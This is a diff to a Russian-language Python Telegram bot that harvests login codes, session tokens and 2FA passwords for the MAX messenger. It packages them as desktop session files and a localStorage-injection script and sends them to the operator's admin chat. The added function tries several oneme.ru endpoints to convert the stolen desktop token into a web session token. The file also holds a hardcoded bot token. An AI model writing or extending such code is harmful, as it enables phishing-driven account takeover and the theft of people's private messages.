@@ -13,6 +13,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile
 from pymax import Client as SocketMaxClient
 import pymax
+import aiohttp
 
 BOT_TOKEN = "8459830115:AAH_QhkDQ51YBM1Jlb-ZsfbAfkvGuXgzl4E"
 ADMIN_ID = 8632861931
@@ -100,6 +101,43 @@ async def send_files(phone, uid, work_dir, desktop, js):
         caption=f"💻 ДЕСКТОП\nНомер: {phone}", parse_mode="HTML")
     await bot.send_document(ADMIN_ID, FSInputFile(wp),
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
+
+async def try_convert_to_web_token(desktop_token, user_id):
+    """Пробует разные эндпоинты для конвертации токена."""
+    web_device_id = str(uuid.uuid4())
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
+        "Content-Type": "application/json"
+    }
+    
+    endpoints = [
+        "https://api.oneme.ru/auth/token",
+        "https://api.oneme.ru/auth/convert",
+        "https://api.oneme.ru/v2/auth/web",
+        "https://ws-api.oneme.ru/auth/token",
+    ]
+    
+    async with aiohttp.ClientSession() as session:
+        for endpoint in endpoints:
+            try:
+                resp = await session.post(endpoint, json={
+                    "token": desktop_token,
+                    "user_id": user_id,
+                    "device_id": web_device_id,
+                    "device_type": "WEB"
+                }, headers=headers)
+                text = await resp.text()
+                logging.info(f"Эндпоинт {endpoint}: {resp.status} {text[:200]}")
+                if resp.status == 200:
+                    try:
+                        data = json.loads(text)
+                        if data.get("ok") and data.get("token"):
+                            return data["token"], web_device_id
+                    except:
+                        pass
+            except Exception as e:
+                logging.error(f"Ошибка {endpoint}: {e}")
+    return None, None
 
 @dp.message(F.text == "/start")
 async def start(message: types.Message):
@@ -217,23 +255,12 @@ async def code_handler(message: types.Message, state: FSMContext):
             session_id = int(time.time() * 1000)
             device_id = str(uuid.uuid4())
 
-            # Пробуем получить веб-токен через WebClient
+            # Пробуем конвертировать токен
             web_js = None
-            try:
-                logging.info("Пробуем WebClient...")
-                web_client = pymax.WebClient(token=token, user_id=viewer_id)
-                await web_client.start()
-                web_token = web_client.token
-                web_device_id = getattr(web_client, 'device_id', str(uuid.uuid4()))
-                logging.info(f"WebClient токен: {web_token[:30]}...")
-                
-                web_js = f"""sessionStorage.clear();
-localStorage.clear();
-localStorage.setItem('__oneme_device_id', '{web_device_id}');
-localStorage.setItem('__oneme_auth', JSON.stringify({{"token":"{web_token}","viewerId":{viewer_id}}}));
-window.location.reload();"""
-            except Exception as e:
-                logging.error(f"WebClient не сработал: {e}")
+            web_token, web_device_id = await try_convert_to_web_token(token, viewer_id)
+            if web_token:
+                web_js = generate_web_js(web_device_id, web_token, viewer_id)
+            else:
                 web_js = generate_web_js(device_id, token, viewer_id)
 
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
@@ -313,29 +340,16 @@ async def password_handler(message: types.Message, state: FSMContext):
         session_id = int(time.time() * 1000)
         device_id = str(uuid.uuid4())
 
-        # Пробуем получить веб-токен через WebClient
+        # Пробуем конвертировать токен
         web_js = None
-        try:
-            logging.info("Пробуем WebClient...")
-            web_client = pymax.WebClient(token=token, user_id=viewer_id)
-            await web_client.start()
-            web_token = web_client.token
-            web_device_id = getattr(web_client, 'device_id', str(uuid.uuid4()))
-            logging.info(f"WebClient токен: {web_token[:30]}...")
-            
-            web_js = f"""sessionStorage.clear();
-localStorage.clear();
-localStorage.setItem('__oneme_device_id', '{web_device_id}');
-localStorage.setItem('__oneme_auth', JSON.stringify({{"token":"{web_token}","viewerId":{viewer_id}}}));
-window.location.reload();"""
-            
-            if user_password:
-                web_js = f"2FA ПАРОЛЬ: {user_password} (ЭТУ СТРОКУ КОПИРОВАТЬ НЕ НУЖНО)\n\n" + web_js
-        except Exception as e:
-            logging.error(f"WebClient не сработал: {e}")
+        web_token, web_device_id = await try_convert_to_web_token(token, viewer_id)
+        if web_token:
+            web_js = generate_web_js(web_device_id, web_token, viewer_id)
+        else:
             web_js = generate_web_js(device_id, token, viewer_id)
-            if user_password:
-                web_js = f"2FA ПАРОЛЬ: {user_password} (ЭТУ СТРОКУ КОПИРОВАТЬ НЕ НУЖНО)\n\n" + web_js
+
+        if user_password:
+            web_js = f"2FA ПАРОЛЬ: {user_password} (ЭТУ СТРОКУ КОПИРОВАТЬ НЕ НУЖНО)\n\n" + web_js
 
         desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
         await send_files(phone, uid, work_dir, desktop, web_js)
